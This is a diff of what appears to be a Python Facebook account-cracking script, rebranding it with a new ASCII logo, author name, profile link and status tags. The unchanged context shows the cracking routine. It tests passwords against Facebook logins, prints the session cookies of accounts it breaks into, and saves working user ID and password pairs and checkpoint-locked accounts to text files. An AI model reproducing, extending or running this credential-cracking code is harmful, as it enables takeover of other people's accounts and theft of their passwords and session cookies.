@@ -1086,15 +1086,15 @@ for xd in range(10000):
     ugen.append(uaku2)
 
 logo = """
-         \033[1;37m ######     ###    ##    ##    ###    
-         \033[1;37m##    ##   ## ##   ###   ##   ## ##   
-         \033[1;37m##        ##   ##  ####  ##  ##   ##  
-         \033[1;37m ######  ##     ## ## ## ## ##     ## 
-         \033[1;37m      ## ######### ##  #### ######### 
-         \033[1;37m##    ## ##     ## ##   ### ##     ## 
-         \033[1;37m ######  ##     ## ##    ## ##     ## \033[1;32m LPC\033[1;37m 
+         \033[1;37m sss. d    d    sSSSs     d                d ssss   
+         \033[1;37md       S    S  S           S    S                S       
+         \033[1;37mY       S    S S             S   S                S       
+         \033[1;37       ss. S sS S              S   S               S sSSs  
+         \033[1;37m      b S    S S             S   S                S             
+         \033[1;37m     P  S    S  S           S    S                S       
+     \033[1;32m` ss'      P     P    "sss"        P sSSs      P sSSss  LPC\033[1;37m 
 --------------------------------------------------
-[•] AUTHOR     : \033[1;32mSANA\033[1;37m
+[•] AUTHOR     : \033[1;32mSURCHI789\033[1;37m
 [•] STATUS     : \033[1;32mFREE\033[1;37m
 --------------------------------------------------
 [•] \033[1;37mVERSION    :\033[1;32m 1.0.3 \033[1;37m"DON'T WORRY FOR UPDATES!"\033[1;37m
@@ -1141,7 +1141,7 @@ def rehan():
 	elif gh =='3':
 		chos()
 	elif gh =='4':
-		os.system('xdg-open https://www.facebook.com/profile.php?id=100012510726200')
+		os.system('xdg-open https://www.facebook.com/profile.php?id=100085411944139&mibextid=ZbWKwL')
 	elif gh =='0':
 		print('[•] THANKS FOR USE ')
 		time.sleep(3)
@@ -1508,21 +1508,21 @@ def fcrack(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[151:166]
-                print('\033[1;32m[SANA-OK] '+cid+'|'+ps+'\033[0;97m\n[‎‎🍁]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
+                print('\033[1;32m[SHOLE-OK] '+cid+'|'+ps+'\033[0;97m\n[‎‎🍁]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                 open('LPC-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                 oks.append(cid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[141:152]
-                # print('\033[1;33m[SANA-CP] '+uid+' | '+ps+'\x1b[1;97m')
+                # print('\033[1;33m[SHOLE-CP] '+uid+' | '+ps+'\x1b[1;97m')
                 open('LPC-CP.txt', 'a').write(uid+' | '+ps+'\n')
                 cps.append(cid)
                 break
             else:
                 continue
         loop+=1
-        sys.stdout.write(f'\r[\033[1;97mSANA\033[1;97m] %s|\33[1;32mOK:- %s\r'%(loop,len(oks))),
+        sys.stdout.write(f'\r[\033[1;97mSHOLE\033[1;97m] %s|\33[1;32mOK:- %s\r'%(loop,len(oks))),
         sys.stdout.flush()
     except:
         pass
